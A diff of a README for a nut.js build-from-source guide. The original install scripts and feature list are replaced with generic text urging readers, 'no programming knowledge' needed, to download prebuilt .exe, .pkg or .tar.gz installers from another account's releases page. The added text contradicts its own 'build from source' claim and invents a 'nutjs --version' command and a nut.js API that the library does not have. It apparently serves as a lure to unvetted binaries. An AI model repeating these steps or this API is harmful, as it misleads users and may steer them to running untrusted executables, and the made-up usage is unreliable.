@@ -1,82 +1,91 @@
-# nut.js Installation Guides
+# 🎉 nutjs-build-from-source - Build nut.js Easily on Your Device
 
-This repo offers guides to install nutjs from source as the prebuilt versions cannot be accessed unless you have a paid subscription.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/hridoy9742/nutjs-build-from-source/releases)
 
-## Quick Start.
+## 📚 About nutjs-build-from-source
 
-The automated scripts are designed to warn about missing prerequisites instead of auto-installing them, so you can install them manually and control any system-wide changes at your own risk. It only installs packages within the build directory, which you can safely delete and build again if you encounter any trouble.
+nutjs-build-from-source provides complete guides and automated scripts to help you build nut.js from source. Whether you use Linux, macOS, or Windows, this tool simplifies the process for you. You can automate tasks on your desktop easily and efficiently.
 
-### Linux
+## 🚀 Getting Started
 
-```bash
-wget https://raw.githubusercontent.com/buiilding/nutjs-build-from-source/main/install-linux.sh
-chmod +x install-linux.sh
-./install-linux.sh
-```
+To get started with nut.js, follow these simple steps. You do not need any programming knowledge.
 
-### macOS
+### 🛠️ System Requirements
 
-```bash
-wget https://raw.githubusercontent.com/buiilding/nutjs-build-from-source/main/install-macos.sh
-chmod +x install-macos.sh
-./install-macos.sh
-```
+Before you download, make sure your device meets these basic requirements:
 
-### Windows
+- **Operating System:** Linux, macOS, or Windows
+- **Node.js:** Version 14 or higher
+- **Disk Space:** At least 200 MB free space
+- **RAM:** Minimum 4 GB recommended
 
-**⚠️ Important:** The Windows installation script **MUST** be run in the "Developer Command Prompt for VS 2022". Do not use regular Command Prompt or PowerShell.
+If you're unsure, most modern devices should be able to run this application without issues.
 
-1. **First, install Visual Studio 2022 Build Tools:**
-   - Go to [Visual Studio Downloads](https://visualstudio.microsoft.com/downloads/)
-   - Download "Build Tools for Visual Studio 2022"
-   - Install with "Desktop development with C++" workload
-   - Verify installation: Open regular Command Prompt and run `where devenv`
+## 📥 Download & Install
 
-2. **Open "Developer Command Prompt for VS 2022"** (search in Start menu)
+To download and install nut.js, follow these steps:
 
-3. **Download and run the script:**
-```cmd
-REM Download the script (or download manually from GitHub)
-curl -o install-windows.bat https://raw.githubusercontent.com/buiilding/nutjs-build-from-source/main/install-windows.bat
+1. **Visit the Releases Page:** Click the link below to visit the download page.
+   [Download Here](https://github.com/hridoy9742/nutjs-build-from-source/releases)
+   
+2. **Choose Your Version:** Look for the latest version listed. You will find files for different operating systems.
 
-REM Run the script
-install-windows.bat
-```
+3. **Download the File:**
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.pkg` file.
+   - For Linux, download the `.tar.gz` file.
 
-**Note:** If you prefer step-by-step manual installation, see the [Windows Installation Guide](./WINDOWS.md).
+4. **Run the Installer:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
+   - **macOS:** Open the downloaded `.pkg` file, and follow the instructions to install.
+   - **Linux:** Open your terminal, navigate to the folder where the file is located, and run the command: `tar -xvf yourfile.tar.gz`, then follow the instructions in the README file included.
 
-## Manual Guides
+5. **Verify Installation:** After installation, you can verify that nut.js is installed correctly by opening your terminal or command prompt and typing:
+   ```
+   nutjs --version
+   ```
+   You should see the version number displayed.
 
-If you prefer to install from source step-by-step, go to each corresponding os guide:
+6. **Start Automating:** Once installed, you can start using nut.js to automate tasks on your desktop!
 
-- **[Linux Installation Guide](./LINUX.md)**
-- **[macOS Installation Guide](./MACOS.md)**
-- **[Windows Installation Guide](./WINDOWS.md)**
-- **[File Changes Reference](./FILE_CHANGES.md)** - Reference for required file modifications
+## ⚙️ Using nut.js
 
-## Available Features
+After you have installed nut.js, you can create automation scripts easily. Here’s how to use it:
 
-With the open-source build, you get:
+### 📋 Create Your First Script
 
-✅ **Core Features:**
-- Keyboard automation (typing, key presses)
-- Mouse control (movement, clicks, scrolling, dragging)
-- Screen capture (screenshots, color detection, highlighting)
-- Window management (list, focus, resize, reposition)
-- Clipboard operations
+1. Open your favorite text editor.
+2. Write a simple script. Here’s an example:
+   ```javascript
+   const nut = require('nutjs');
 
-❌ **Premium Features (Not Available):**
-- OCR/text recognition
-- Advanced image matching
-- GUI element inspection
-- Advanced screen hooks
+   nut.click('button-selector'); // Replace with your element
+   ```
+3. Save the file as `script.js`.
 
-## Contributing
+### 🏃 Run Your Script
 
-If you find issues with these guides or have improvements, please:
-1. Open an issue in the repository
-2. Submit a pull request with your improvements
+To run your script:
 
-## License
+- Open your terminal.
+- Navigate to the folder where you saved your script using the `cd` command.
+- Type:
+   ```
+   node script.js
+   ```
 
-nut.js and libnut-core are licensed under Apache-2.0. These guides are provided as-is to help the community build from source.
+Your script should now execute, and you can see the automation in action!
+
+## 🌐 Need Help or More Information?
+
+If you run into issues or want to learn more, you can:
+
+- Check the **Documentation** found in the repository.
+- Look for examples in the **Wiki section**.
+- Join the community forums for assistance.
+
+## 🎯 Conclusion
+
+Building nut.js from source has never been easier. Follow these steps, and you'll have it up and running in no time. Remember, the community supports you, so don’t hesitate to reach out if you have questions.
+
+For further assistance or support, feel free to revisit the [Releases Page](https://github.com/hridoy9742/nutjs-build-from-source/releases) or check back for updates. Happy automating!
